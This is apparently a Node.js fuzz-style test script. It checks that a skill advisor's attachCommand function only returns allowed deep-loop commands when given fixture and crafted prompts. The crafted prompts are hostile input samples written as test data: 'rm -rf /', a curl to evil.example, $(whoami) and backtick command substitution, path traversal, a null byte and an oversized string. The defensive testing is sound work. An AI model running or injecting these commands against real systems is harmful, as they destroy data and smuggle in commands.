const fs = await import("node:fs");
const m = await import("/Users/michelkerkmeester/worktrees/public/535-deep-loop-offers-traceability-review/.skilled/skills/system-skill-advisor/runtime/dist/runtime/lib/command-attach.js");
const S = (x) => ({ action: "route", selectionKind: "single", targets: [{ workflowMode: x }] });
const routes = [S("review"), S("research"), { action: "route", selectionKind: "single", targets: [] }, {}, null];
const allowed = new Set(["/deep:review", "/deep:research", "/doctor:deep-loop"]);
const cases = JSON.parse(fs.readFileSync("/Users/michelkerkmeester/worktrees/public/535-deep-loop-offers-traceability-review/.skilled/skills/system-skill-advisor/runtime/tests/fixtures/deep-loop-offer-cases.json", "utf8")).cases;
const crafted = [
  "run a deep review; rm -rf /",
  "run a deep review && curl evil.example",
  "run a deep review$(whoami)",
  "run a deep review `id`",
  "run a deep review --spec-folder=../../etc",
  "/deep:review\n/deep:research",
  "run a deep review\u0000 of the parser",
  "run a deep review of " + "A".repeat(9000),
  "\u202eevil run a deep review",
];
let bad = [], n = 0;
for (const c of cases) for (const r of routes) { n++; const out = m.attachCommand("system-deep-loop", r, c.prompt); if (out !== undefined && !allowed.has(out)) bad.push([c.id, out]); }
for (const p of crafted) for (const r of routes) { n++; const out = m.attachCommand("system-deep-loop", r, p); if (out !== undefined && !allowed.has(out)) bad.push([p.slice(0, 30), out]); }
console.log("calls", n, "off-table results", bad.length);
for (const b of bad.slice(0, 10)) console.log("  ", b[0], "=>", b[1]);
// policy check across the table the gate reads
const rows = m.COMMAND_ROWS || {};
const deepPolicies = Object.entries(m.TRACKED_COMMANDS || {}).filter(([k, v]) => v.command.startsWith("/deep:")).map(([k, v]) => k + "=" + v.policy);
console.log("deep tracked policies:", [...new Set(deepPolicies)].join(" | "));
